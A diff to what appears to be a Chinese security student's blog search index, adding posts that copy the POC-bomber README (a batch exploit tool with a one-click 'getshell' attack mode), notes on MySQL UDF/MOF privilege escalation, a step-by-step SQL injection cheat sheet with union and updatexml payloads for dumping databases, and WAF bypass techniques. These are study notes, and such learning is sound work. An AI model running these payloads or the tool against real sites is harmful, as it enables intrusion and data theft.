@@ -56,6 +56,274 @@
 ]]></content>
   </entry>
   <entry>
+    <title>🔥 POC-bomber</title>
+    <url>/2023/05/12/POC%E9%9B%86/</url>
+    <content><![CDATA[<p>🦄 <strong>POC bomber 是一款漏洞检测&#x2F;利用工具，旨在利用大量高危害漏洞的POC&#x2F;EXP快速获取目标服务器权限</strong></p>
+<p>本项目收集互联网各种危害性大的 RCE · 任意文件上传 · 反序列化 · sql注入 等高危害且能够获取到服务器核心权限的漏洞POC&#x2F;EXP，并集成在 POC bomber 武器库中，利用大量高危害POC对单个或多个目标进行模糊测试，以此在大量资产中快速获取发现脆弱性目标，获取目标服务器权限。适用场景包括但不仅限于以下:</p>
+<ol>
+<li>红蓝对抗或hvv中帮助红队在大量资产中快速找到突破口进入内网</li>
+<li>内网安全测试，横向移动</li>
+<li>利用新型0day对企业资产进行批量评估</li>
+</ol>
+<h2 id="📝-简介"><a href="#📝-简介" class="headerlink" title="📝 简介"></a>📝 简介</h2><p>POC bomber 的poc支持weblogic，tomcat，apache，jboss，nginx，struct2，thinkphp2x3x5x，spring，redis，jenkins，php语言漏洞，shiro，泛微OA，致远OA，通达OA等易受攻击组件的漏洞检测，支持调用dnslog平台检测无回显的rce(包括log4j2的检测)，支持单个目标检测和批量检测，程序采用高并发线程池，支持自定义导入poc&#x2F;exp，并能够生成漏洞报告<br>POC bomber默认使用验证模式进行poc的验证，如返回结果中attack的值为True时，可以加参数(–attack)进入攻击模式直接调用exp进行攻击(需要指定poc文件名)，达到一键getshell</p>
+<h2 id="😄-红队专版-RedTeam-3-0"><a href="#😄-红队专版-RedTeam-3-0" class="headerlink" title="😄 红队专版-RedTeam 3.0"></a>😄 红队专版-RedTeam 3.0</h2><p>追求更快的速度？更稳定的框架？更低的资源占用？更高的检测效率？更多的poc&#x2F;exp集成利用？<br>尽请期待 POC-bomber RedTeam 3.0，目前仅限内部测试中，请持续关注项目更新。</p>
+<h2 id="💻-Screenshots"><a href="#💻-Screenshots" class="headerlink" title="💻 Screenshots"></a>💻 Screenshots</h2><h4 id="🏆-验证模式"><a href="#🏆-验证模式" class="headerlink" title="🏆 验证模式"></a>🏆 验证模式</h4><pre><code>    python3 pocbomber.py -u http://xxx.xxx
+</code></pre>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/168099161-f46a54f7-562b-4ba5-a751-1d65492b17d9.png"
+                      alt="image"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/147481630-f8b94566-572f-4d89-a874-dc01f5041377.png"
+                      alt="image"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/148684886-98b0f1ff-76f5-48d3-8d2d-932635392a33.gif"
+                      alt="verify模试演示"
+                ></p>
+<h4 id="⚡️-攻击模式"><a href="#⚡️-攻击模式" class="headerlink" title="⚡️ 攻击模式"></a>⚡️ 攻击模式</h4><pre><code>    python3 pocbomber.py -u http://xxx.xxx --poc=&quot;thinkphp2_rce.py&quot; --attack
+</code></pre>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/147629887-def9d18e-f6aa-466a-ab2c-2538752b82aa.png"
+                      alt="image"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/148206720-86f77246-301c-481f-a16c-b36047f72d7c.png"
+                      alt="image"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://user-images.githubusercontent.com/71172892/148684097-67b59320-6758-458d-ac6b-ae219c327924.gif"
+                      alt="attack模式演示"
+                ></p>
+<h2 id="🔧-安装"><a href="#🔧-安装" class="headerlink" title="🔧 安装"></a>🔧 安装</h2><pre><code>  git clone https://github.com/tr0uble-mAker/POC-bomber.git            
+  cd POC-bomber
+  pip install -r requirements.txt
+</code></pre>
+<h2 id="🚀-用法"><a href="#🚀-用法" class="headerlink" title="🚀 用法"></a>🚀 用法</h2><pre><code>    查看用法:     python3 pocbomber.py
+    
+    模式:
+            获取poc/exp信息:   python3 pocbomber.py --show
+            单目标检测:        python3 pocbomber.py -u http://xxx.xxx.xx
+            批量检测:          python3 pocbomber.py -f url.txt -o report.txt 
+            指定poc检测:       python3 pocbomber.py -f url.txt --poc=&quot;thinkphp2_rce.py&quot;
+            exp攻击模式:       python3 pocbomber.py -u 目标url --poc=&quot;指定poc文件&quot; --attack
+    参数:
+            -u  --url      目标url
+            -f  --file     指定目标url文件   
+            -o  --output   指定生成报告的文件(默认不生成报告)
+            -p  --poc      指定单个或多个poc进行检测, 直接传入poc文件名, 多个poc用(,)分开
+            -t  --thread   指定线程池最大并发数量(默认30)
+            --show         展示poc/exp详细信息
+            --attack       使用poc文件中的exp进行攻击
+            --dnslog       使用dnslog平台检测无回显漏洞(默认不启用dnslog,可在配置文件中启用)
+</code></pre>
+<h2 id="🔆-配置文件"><a href="#🔆-配置文件" class="headerlink" title="🔆 配置文件"></a>🔆 配置文件</h2><pre><code>  /inc/config.py   
+</code></pre>
+<p>​          </p>
+<h2 id="⚠️-常见问题"><a href="#⚠️-常见问题" class="headerlink" title="⚠️ 常见问题"></a>⚠️ 常见问题</h2><ol>
+<li>程序不安装requirements.txt就可以直接运行，只依赖requests第三方库，其他库安装不上不影响程序运行，但有些poc会不能检测</li>
+<li>log4j2命令执行漏洞的检测：需要添加 –dnslog  参数 </li>
+<li>无回显漏洞检测默认使用 dnslog.cn 平台且默认关闭, 要开启需前往配置文件将 dnslog_flag 开关置为True  </li>
+<li>需要指定一个poc才能调用–attack攻击模式</li>
+</ol>
+<h2 id="📁-目录结构"><a href="#📁-目录结构" class="headerlink" title="📁 目录结构:"></a>📁 目录结构:</h2><pre><code>  +--------- poc_bomber.py (启动 POC-bomber)
+  | 
+  +--------- inc(存放支撑 POC-bomber 框架运行的核心文件)
+  |
+  \--------- pocs(POC存放列表)----------- framework(存放框架漏洞POC)
+                                  |
+                                  |------ middleware(存放中间件漏洞POC)
+                                  |
+                                  |------ ports(存放常见端口漏洞,主机服务漏洞POC)
+                                  |
+                                   \----- webs(存放常见web页面漏洞POC)
+</code></pre>
+<p>​      </p>
+<h2 id="📖-POC编写规则"><a href="#📖-POC编写规则" class="headerlink" title="📖 POC编写规则"></a>📖 POC编写规则</h2><p>POC bomber支持自定义编写poc<br>poc统一要求python3编写，具有verify和attack(非必须)两个函数分别进行验证和攻击,                     </p>
+<h4 id="👻-漏洞验证函数-verify-编写应该满足以下条件"><a href="#👻-漏洞验证函数-verify-编写应该满足以下条件" class="headerlink" title="👻 漏洞验证函数(verify)编写应该满足以下条件:"></a>👻 漏洞验证函数(verify)编写应该满足以下条件:</h4><ol>
+<li><p>函数名为 verify ， 参数接收目标url的参数           </p>
+</li>
+<li><p>函数的返回结果以字典的形式返回并且具有name和vulnerable两个键值，name说明漏洞名称，vulnerable通过True和False的状态表明漏洞是否存在</p>
+</li>
+<li><p>如果存在漏洞要将返回字典中vulnerable的值置为True, 并添加目标url, 漏洞利用相关网页等信息</p>
+</li>
+<li><p>用try方法尝试验证，使用request等发送数据包时要设置超时时间, 避免poc会卡死                              </p>
+<pre><code> def verify(url):                        
+     relsult = &#123;                                            
+         &#39;name&#39;: &#39;Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability&#39;,                          
+         &#39;vulnerable&#39;: False，
+         &#39;attack&#39;： False，        # 如果有exp支持attack模式将attack的值置为True
+     &#125;              
+     try:                    
+         ......        
+         (用任意方法检测漏洞)             
+         ......
+         if 存在漏洞:
+             relsult[&#39;vulnerable&#39;] = True     # 将relsult的vulnerable的值置为True
+             relsult[&#39;url&#39;] = url             # 返回验证的url
+             relust[&#39;xxxxx&#39;] = &#39;xxxxx&#39;        # 可以添加该漏洞相关来源等信息   
+             ......           
+             return relsult     # 将vulnerable值为True的relsult返回                   
+         else:  # 不存在漏洞           
+             return relsult    # 若不存在漏洞将vulnerable值为False的relsult返回
+ 
+     execpt:
+         return relsult
+</code></pre>
+</li>
+</ol>
+<p>如果有exp可以编写 attack 函数作为exp攻击函数，</p>
+<h4 id="🎃-漏洞攻击函数-attack-编写应该满足以下条件："><a href="#🎃-漏洞攻击函数-attack-编写应该满足以下条件：" class="headerlink" title="🎃 漏洞攻击函数(attack)编写应该满足以下条件："></a>🎃 漏洞攻击函数(attack)编写应该满足以下条件：</h4><ol>
+<li><p>函数名为 attack ， 参数接收目标url的参数  </p>
+</li>
+<li><p>并在try中编写exp代码进行攻击, 可以与用户交互输入       </p>
+</li>
+<li><p>编写完成后将该漏洞的verify函数返回字典中attack值置为True </p>
+</li>
+<li><p>攻击成功后返回True，其他原因失败的话返回False即可        </p>
+<pre><code> def attack(url):    
+   try:            
+       ........................................            
+         攻击代码(执行命令或反弹shell上传木马等)             
+       ........................................
+       return True
+   except:               
+       return False    
+</code></pre>
+<p> ​</p>
+</li>
+</ol>
+<p>编写完成后的poc直接放入 &#x2F;pocs 目录下任意位置即可被递归调用!    </p>
+<p>项目持续更新中，欢迎各位师傅贡献poc共筑网络安全！<br>有问题欢迎issues留言: <a class="link"   href="https://github.com/tr0uble-mAker/POC-bomber/issues" >https://github.com/tr0uble-mAker/POC-bomber/issues <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>     </p>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。<br>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。<br>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>关于我</title>
+    <url>/2023/04/17/hello-world/</url>
+    <content><![CDATA[<h1 id="Hi-Boys-and-Girls"><a href="#Hi-Boys-and-Girls" class="headerlink" title="Hi Boys and Girls!"></a>Hi Boys and Girls!</h1><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Screenshot_20230419_094457.jpg"
+                     
+                ></p>
+<p>​		你们好，我是Cream（笔名：顾彬彬），00后，就读于某某学院（hint：“老徐你要老婆不要?”），软件工程专业， 写Blog(博客)为了记录自己的学习历程，监督自己学习，督促自己成长，个人觉得只有自己写出来的知识才是学到手的东西，那才是自己的东西，现在已经入行网络信息安全行业了，现在还在沉淀阶段，以后也会深耕这个行业，并为之奉献，为中国的信息安全行业贡献自己的一份力量，抵制国外黑客入侵，保卫中国信息安全，从你我做起，从现在做起，识别钓鱼链接，不点击钓鱼链接，不给敌人可乘之机。</p>
+<h2 id="我的技能"><a href="#我的技能" class="headerlink" title="我的技能"></a>我的技能</h2><ul>
+<li>目前主攻的还是web安全方向，也会一些网络华为数通、安全设备的知识</li>
+<li>会渗透测试的基本流程，有实战漏扫经验、目前任职于一家国内等保测评公司</li>
+</ul>
+<h2 id="我的兴趣爱好"><a href="#我的兴趣爱好" class="headerlink" title="我的兴趣爱好"></a>我的兴趣爱好</h2><p>以下是一些少有的坚持下来的爱好：</p>
+<p>旅行：去过杭州西湖、成都春熙路、成都武侯祠、乐山大佛、湖南岳阳楼、上海东方明珠等等，但是还是想去西藏拉萨、故宫博物馆、北京八达岭长城，计划利用放假时间出去好好玩玩，记录美好时光<br>唱歌：有事没有机会唱一下，唱歌能够使人发泄不快乐的情绪，有利于保持好心情，哈哈哈<br>游戏：以前玩儿，现在很少玩了，以前主玩英雄联盟，但是操作跟不上了就放下了，现在也只玩玩手游联盟，陶冶情操罢了</p>
+<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/2029766.jpg"
+                     
+                ></p>
+<p>​		很高兴你能够访问我的Blog（博客），希望可以帮助到你，同时也非常高兴认识你！😊</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>MySQL提权</title>
+    <url>/2023/04/19/mysql%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>udf函数按照其运行模式可以分为单次调用型和聚集函数型两类，单词调用型能够针对数据库查询的每一行记录进行处理，聚集函数型用于处理 group by等聚集函数。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，然后创建一个指向udf.dll的自定义函数，从而在数据库进行查询，而查询的结果则等价于在cmd或shell中执行命令。</p>
+<h3 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h3><p>Windows 2000操作系统需要导出udf.dll到c:\winnt\udf.dll；Windows 2003操作系统导出udf.dll到c:\Windows\udf.dll；</p>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<p>当mysql账户权限是root，然后使用root权限去执行我们上传的mof，隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<h3 id="浏览器解码"><a href="#浏览器解码" class="headerlink" title="浏览器解码"></a>浏览器解码</h3><p>atob()</p>
+<p>​						</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入的注入攻略</title>
+    <url>/2023/04/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E6%94%BB%E7%95%A5/</url>
+    <content><![CDATA[<h1 id="联合注入攻略"><a href="#联合注入攻略" class="headerlink" title="联合注入攻略"></a>联合注入攻略</h1><h2 id="1、判断注入点（同时构造闭合符号）"><a href="#1、判断注入点（同时构造闭合符号）" class="headerlink" title="1、判断注入点（同时构造闭合符号）"></a>1、判断注入点（同时构造闭合符号）</h2><p>当输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1 – q   &#x2F;&#x2F; 正常</p>
+<p>而输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;2 – q   &#x2F;&#x2F;报错</p>
+<p>则可证明是存在sql注入的。</p>
+<h2 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) order by 3 -- q   //若报错则字段数不为3，没报错则字段数就是3</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,3 -- q   //这里注意前面的传参id要是不存在的，这样后面的select查询才能显现出来</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆出数据库名"><a href="#4、爆出数据库名" class="headerlink" title="4、爆出数据库名"></a>4、爆出数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆出表名"><a href="#5、爆出表名" class="headerlink" title="5、爆出表名"></a>5、爆出表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="6、爆字段名"><a href="#6、爆字段名" class="headerlink" title="6、爆字段名"></a>6、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q		//查询表下的字段名</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="7、爆字段内的数据"><a href="#7、爆字段内的数据" class="headerlink" title="7、爆字段内的数据"></a>7、爆字段内的数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,group_concat(字段名),group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="布尔报错注入的注入攻略"><a href="#布尔报错注入的注入攻略" class="headerlink" title="布尔报错注入的注入攻略"></a>布尔报错注入的注入攻略</h1><p>报错注入是没有回显点位的，只能运用updatexml()函数来进行让他报错，从报错信息里面的到我们需要的信息。</p>
+<h2 id="1、构造闭合符号"><a href="#1、构造闭合符号" class="headerlink" title="1、构造闭合符号"></a>1、构造闭合符号</h2><p><strong>第一种情况</strong>：<strong>不是</strong>该闭合符</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;正常</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
+<p><strong>第二种情况</strong>：<strong>是</strong>该闭合符</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;报错</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
+<p>或者</p>
+<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1(2) –+      &#x2F;&#x2F;变幻1&#x3D;1,1&#x3D;2来进行判断，如果是当前的构造符号，1&#x3D;2时应该报错，如果是正常则可以不是正确的构造符，通过变幻构造符好来判断出正常的构造符号</p>
+<h2 id="2、发现是报错注入，采用updataxml函数进行爆数据库名"><a href="#2、发现是报错注入，采用updataxml函数进行爆数据库名" class="headerlink" title="2、发现是报错注入，采用updataxml函数进行爆数据库名"></a>2、发现是报错注入，采用updataxml函数进行爆数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q    //显示当前数据库的库名。Concat()时进行一个拼接的，把感叹号（！）和逗号后面的数据进行拼接。</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、爆数据表名"><a href="#3、爆数据表名" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆字段名"><a href="#4、爆字段名" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆字段数据"><a href="#5、爆字段数据" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="基于错误的POST型联合注入-11、12关"><a href="#基于错误的POST型联合注入-11、12关" class="headerlink" title="基于错误的POST型联合注入(11、12关)"></a>基于错误的POST型联合注入(11、12关)</h1><h2 id="1、尝试万能密码"><a href="#1、尝试万能密码" class="headerlink" title="1、尝试万能密码"></a><strong>1、尝试万能密码</strong></h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )or 1&#x3D;1 – q</p>
+<h2 id="2、判断字段数-1"><a href="#2、判断字段数-1" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1 order by 3 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、判断显错位"><a href="#3、判断显错位" class="headerlink" title="3、判断显错位"></a>3、判断显错位</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、判断表名"><a href="#4、判断表名" class="headerlink" title="4、判断表名"></a>4、判断表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆列名"><a href="#5、爆列名" class="headerlink" title="5、爆列名"></a>5、爆列名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="6、爆数据"><a href="#6、爆数据" class="headerlink" title="6、爆数据"></a>6、爆数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="POST变形双报错注入-13、14，17是密码行未过滤"><a href="#POST变形双报错注入-13、14，17是密码行未过滤" class="headerlink" title="POST变形双报错注入(13、14，17是密码行未过滤)"></a>POST变形双报错注入(13、14，17是密码行未过滤)</h1><h2 id="1、万能密码判断是否存在注入点"><a href="#1、万能密码判断是否存在注入点" class="headerlink" title="1、万能密码判断是否存在注入点"></a>1、万能密码判断是否存在注入点</h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) or 1&#x3D;1 – q</p>
+<h2 id="2、利用报错信息爆库"><a href="#2、利用报错信息爆库" class="headerlink" title="2、利用报错信息爆库"></a>2、利用报错信息爆库</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3、爆数据表名-1"><a href="#3、爆数据表名-1" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4、爆字段名-1"><a href="#4、爆字段名-1" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="5、爆字段数据-1"><a href="#5、爆字段数据-1" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="抓包修改user-agent"><a href="#抓包修改user-agent" class="headerlink" title="抓包修改user-agent"></a>抓包修改user-agent</h1><p>‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1,1) – q</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>WAF&quot;web应用程序防火墙&quot;</title>
+    <url>/2023/04/19/waf/</url>
+    <content><![CDATA[<h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><p>是一种用于保护Web应用程序的安全设备，Web应用程序是指通过Web浏览器访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络上的攻击。</p>
+<h1 id="和防火墙的区别"><a href="#和防火墙的区别" class="headerlink" title="和防火墙的区别"></a>和防火墙的区别</h1><p>和传统防火墙的区别是，它是工作在应用层的防火墙，主要对web请求&#x2F;响应进行防护。</p>
+<h1 id="waf原理"><a href="#waf原理" class="headerlink" title="waf原理"></a>waf原理</h1><p>WAF可以通过对Web应用程序的流量进行过滤和监控，识别并阻止潜在的安全威胁。WAF可以检测Web应用程序中的各种攻击，例如SQL注入、跨站点脚本攻击（XSS）、跨站请求伪造（CSRF）等，并采取相应的措施，例如拦截请求、阻止访问、记录事件等<br>WAF的工作原理通常包括以下几个步骤：</p>
+<p>流量识别：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。</p>
+<p>攻击检测：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。</p>
+<p>攻击响应：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。</p>
+<p>日志记录：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。</p>
+<h1 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h1><p>WAF可以在多个层次对Web应用程序进行保护。常见的WAF包括：</p>
+<p>硬件WAF：硬件WAF通常是一种独立设备，它可以与网络交换机、路由器等设备集成，拦截来自外部网络的流量，并对Web应用程序进行保护。硬件WAF通常具有高性能和低延迟，适用于高流量的Web应用程序。</p>
+<p>软件WAF：软件WAF通常是一种安装在服务器上的应用程序，可以通过修改Web服务器或代理服务器的配置文件实现。软件WAF可以与多种Web服务器和应用程序框架集成，包括Apache、Nginx、IIS等。软件WAF通常具有灵活性和易于配置的优点，适用于多种Web应用程序。</p>
+<p>云WAF：云WAF通常是一种基于云的服务，可以将Web应用程序的流量转发到云端进行处理。云WAF可以提供全球分布的节点，从而提高Web应用程序的可用性和性能。云WAF通常具有弹性扩展、自动升级等优点，适用于高可用性和高性能的Web应用程序。</p>
+<h1 id="WAF的特点"><a href="#WAF的特点" class="headerlink" title="WAF的特点"></a>WAF的特点</h1><p>监测和拦截恶意流量：WAF可以监测流经其设备的所有流量，对恶意流量进行拦截，保护Web应用程序免受各种攻击。</p>
+<p>基于规则的检测：WAF通常采用基于规则的检测技术，通过预定义规则或自定义规则来检测并拦截恶意流量。</p>
+<p>防止漏洞利用：WAF可以检测和拦截各种漏洞利用攻击，如SQL注入、XSS、CSRF、命令注入等。</p>
+<p>安全策略：WAF可以通过安全策略来限制流量的来源、目标和类型，从而实现更精细的流量控制和访问控制。</p>
+<p>高可用性：WAF通常具有高可用性，可以通过多节点部署和负载均衡来实现高可靠性和可扩展性。</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>1、脏数据绕过<br>即传入一段长数据使waf失效，从而实现绕过waf。某些waf处理POST的数据时，只会检测开头的8K，后面选择全部放过。<br>2、高并发绕过<br>对请求进行并发，攻击请求会被负载均衡调度到不同节点，导致某些请求绕过了waf的拦截<br>3、编码绕过<br>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。<br>例如最常见的url编码，对数据进行二次url编码，waf进行一次解码并不能解析到有效的数据，而后端在进行解码时传入的为有效的恶意数据。<br>4、请求方式转换<br>waf 在对危险字符进行检测的时候，分别为 post 请求和 get 或者其它的请求方式设定了不同的匹配规则，请求被拦截，变 换请求方式有几率能绕过检测</p>
+]]></content>
+  </entry>
+  <entry>
     <title>PHP基础（掌握点）</title>
     <url>/2023/04/21/PHP%E5%9F%BA%E7%A1%80/</url>
